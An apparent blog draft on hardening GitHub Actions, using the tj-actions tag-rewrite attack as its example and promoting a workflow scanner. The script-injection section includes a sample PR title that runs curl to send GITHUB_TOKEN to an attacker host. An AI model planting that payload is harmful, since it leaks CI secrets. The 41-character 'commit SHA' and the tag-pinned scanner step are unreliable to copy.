---
title: The tj-actions attack hit 23,000 repos. Here's what your workflows are still doing wrong.
published: false
tags: security, github, devops, cicd
---

In March 2025, a single compromised GitHub Action took down 23,000+ repositories. The attack was elegant in a frustrating way: the attacker gained write access to `tj-actions/changed-files`, rewrote the Git tags to point to malicious commits, and every repo that used that action on a tag reference pulled in the poisoned code on their next run. No one was notified. CI just ran normally, except now it was dumping secrets to the workflow logs.

The attack vector was not exotic. It was a one-liner in thousands of workflows:

```yaml
- uses: tj-actions/changed-files@v35
```

That `@v35` is a tag. Tags are mutable. Anyone with write access to the upstream repo can move a tag to any commit. You have no idea when it changes.

## Why pinning to tags is not pinning

The word "pinning" gets misused constantly in this context. If you write `@v3` or `@v35`, you are not pinned to anything. You are subscribed to whatever the maintainer (or an attacker who compromised the maintainer) decides that tag should point to today.

Real pinning means a commit SHA:

```yaml
# Vulnerable — tag reference, can be rewritten
- uses: tj-actions/changed-files@v35

# Safe — commit SHA, immutable
- uses: tj-actions/changed-files@d08d32c7641b7b7c31f3fbd47e4c2c6b43468693  # v35
```

A 40-character SHA is immutable. If the upstream repo is compromised and the attacker tries to move that commit to malicious code, the SHA changes. Your workflow keeps running the exact code you reviewed.

The `# v35` comment is not decoration. It's how you remember what you pinned to when it's time to update.

Most repos don't do this. I scanned a sample of public repos after writing this tool and unpinned actions outnumbered pinned ones by roughly 10 to 1.

## The three attack surfaces

The tj-actions incident was the highest-profile example of the first attack surface, but it's not the only one.

**1. Unpinned actions (supply chain)**

Covered above. Any `@tag` or `@branch` reference is a live subscription to code you don't control.

**2. Overly broad permissions**

GitHub Actions workflows run with a `GITHUB_TOKEN` that has configurable permissions. A lot of workflows never configure them:

```yaml
# This workflow has no permissions block.
# GitHub's default grants read to most scopes and may grant write.
# Depending on your org settings, this could mean write to contents,
# pull-requests, packages, actions, and more.
name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test
```

If a compromised step runs in this workflow, it potentially has write access to your entire repo. The fix is explicit and minimal:

```yaml
name: CI
on: [push]

permissions:
  contents: read  # Just enough for checkout

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@a81bbbf8298c0fa03ea29cdc473d45aca646fdde3  # v4
      - run: npm test
```

Least privilege. Declare what you need, nothing else.

**3. Script injection via untrusted GitHub context**

This one is subtle and surprisingly common in workflows that display PR information or post comments.

```yaml
# Vulnerable — PR title goes directly into a shell command
- name: Post comment
  run: |
    echo "PR title: ${{ github.event.pull_request.title }}"
```

The problem: `github.event.pull_request.title` is attacker-controlled. Anyone who can open a PR can set the title to `"; curl https://attacker.com/exfil?token=$GITHUB_TOKEN; echo "`. That string gets interpolated into the shell command before execution.

The fix is to route untrusted values through environment variables:

```yaml
# Safe — input goes to env var, referenced as $ENV_VAR in shell
- name: Post comment
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "PR title: $PR_TITLE"
```

Environment variable expansion in bash does not allow command injection. The `${{ }}` interpolation happens before the shell sees the command; the `$ENV_VAR` expansion happens inside the shell with proper quoting semantics.

The full list of untrusted contexts includes PR title, body, branch name, issue title, comment body, commit message, and author fields. All of these can be set by external contributors.

## I built a scanner for this

After the tj-actions incident I went looking for a tool that would catch all three of these issues in a single pass and fail CI if it found them. Nothing I found handled all three together, so I built [gh-workflow-hardener](https://github.com/indoor47/gh-workflow-hardener).

It's a Python CLI with no heavy dependencies. `pyyaml` and `click`. The scanner checks for unpinned actions, dangerous permissions, and script injection across all workflow files in `.github/workflows/`.

Running it against a repo:

```bash
pip install gh-workflow-hardener
gh-workflow-hardener scan .
```

Example output on a repo with issues:

```
gh-workflow-hardener v1.0.0
Issues found: 3

[CRITICAL] Line 12: unpinned-action
  Action `actions/checkout@v3` is not pinned to a commit SHA.
  Tags and branches can be moved to point to malicious code.
  See: tj-actions/changed-files supply chain attack (March 2025).
  Fix: Pin to SHA: `uses: actions/checkout@<commit-sha>  # v3`

[HIGH] Line 1: missing-permissions
  No top-level `permissions` block defined.
  Without explicit permissions, the GITHUB_TOKEN gets the repository's
  default permissions (often read-write).
  Fix: Add at the top level:
  permissions:
    contents: read

[CRITICAL] Line 31: script-injection
  Untrusted input `${{ github.event.pull_request.title }}` used in a `run:` block.
  An attacker can inject arbitrary shell commands through this value.
  Fix: Move to env block:
    env:
      UNTRUSTED_INPUT: ${{ github.event.pull_request.title }}
    run: echo "$UNTRUSTED_INPUT"
```

The more useful pattern is as a GitHub Action that runs on workflow file changes, blocking PRs that introduce new vulnerabilities:

```yaml
name: Workflow Security Check
on:
  pull_request:
    paths:
      - '.github/workflows/**'
  push:
    branches:
      - main
    paths:
      - '.github/workflows/**'

permissions:
  contents: read

jobs:
  hardener:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@a81bbbf8298c0fa03ea29cdc473d45aca646fdde3  # v4
      - uses: indoor47/gh-workflow-hardener@v1.0.0
        with:
          fail_on: critical
```

This means every PR that touches a workflow file gets scanned automatically. Any new unpinned action or script injection issue blocks merge.

The `--fail-on` flag controls threshold. `critical` for unpinned actions and script injection. `high` also catches missing or overly broad permission blocks. Setting it to `none` runs in report-only mode, useful for a first pass on an existing repo without wanting to block everything at once.

## The scope of the problem

The tj-actions attack was a wake-up call, but the vulnerability it exploited had been documented for years. GitHub's own security hardening guide covers SHA pinning. The StepSecurity tooling existed before the attack. The problem was not awareness at the top — it was that checking for these issues required manual review or assembling multiple tools.

23,000 repositories were exposed. The actual number of vulnerable repos was much higher; those were just the ones using that specific action. Unpinned actions are the default behavior. Nothing in the GitHub UI warns you that `@v3` is mutable. The checkbox for "require SHA pinning" does not exist in repository settings.

Until it's a platform default, it has to be enforced at the workflow level. That's what this tool is for.

---

Repo: [github.com/indoor47/gh-workflow-hardener](https://github.com/indoor47/gh-workflow-hardener)

If you find a false positive or a detection case I missed, open an issue.
